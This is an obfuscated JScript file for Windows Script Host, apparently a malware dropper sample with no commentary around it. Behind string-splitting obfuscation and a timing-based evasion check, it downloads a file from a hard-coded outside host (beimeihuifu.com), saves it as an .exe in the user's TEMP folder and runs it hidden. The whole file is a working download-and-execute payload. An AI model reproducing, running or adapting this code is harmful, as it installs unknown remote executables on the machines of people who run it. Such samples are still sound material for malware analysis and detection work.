var YG0 = false;
var NW = "Create"+"Object";
var R = function YG() {return WScript[NW]("WScript"+".Shell");}(), X = 11;
var KT = "MSXML2"+".XMLHTTP";
var FV = 2;
var CJ = FV - 2;
function CV(H0){R["Run"](H0, CJ, CJ);};
function Y(){return KT + "";};
function AJ(R0, NR){CJ = CJ * 1; return R0 - NR;};
function MD(){return NW;};
/*@cc_on
  @if (@_win32 || @_win64)
    YG0 = true;
  @end
@*/
if (YG0)
{
var J = "";
function H(){return 22;};
var FH = 0; var F = 0;
function GI()
{
var WS = new this["Date"]();
var Y0 = WS["getUTCMilliseconds"]();
WScript["Sleep"](H());
var WS = new this["Date"]();
var TY = WS["getUTCMilliseconds"]();
WScript["Sleep"](H());
var WS = new this["Date"]();
var B = WS["getUTCMilliseconds"]();
var FH = "QO";
FH = AJ(TY, Y0);
var F = "WO";
F = AJ(B, TY);
J = "open";
return AJ(FH, F);
}
var O = false;
var OB = false;
for (var LV = CJ; LV < H() * 1; LV++){if (GI() != CJ){
O = true; 
F = "31" + 11 * FH + F; 
OB = true; 
break;
}}
function I() {return ((O == true) && (O == OB)) ? 1 : CJ;};
if (O && I() && OB){
function DL() {return R["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ivD3cgvcph.ex" + "e";};
 WX = Y();
 PJ = WScript[NW](WX);
 var LS = 1;
do { 
	for (;LS;){
	try {
		if (LS == 1)
		{
			PJ[J]("GET", "http://beimeihuifu.com/n7dja", false);
			PJ["send"]();
			M = "Sleep";
			LS = 2;
		}
		WScript[M](H() + 120); 
		if (PJ["readystate"] < 2 * 2) continue;
		LS = CJ;
		function RO(QL) {var SX = (1, 2, 3, 4, 5, QL); return SX;};
		O0 = WScript[MD()]("ADODB.Stream");
		WX = O0;
		WX[J]();
		WX["type"] = RO(1);
		WX["write"](PJ["ResponseBody"]);
		O0["position"] = RO(CJ);
		WX["Save" + "ToFile"](DL(), 2);
		O0["cl"+"ose"]();
		T = DL();
		CV(T);
	} catch(V){};};
}while (LS);
}
}

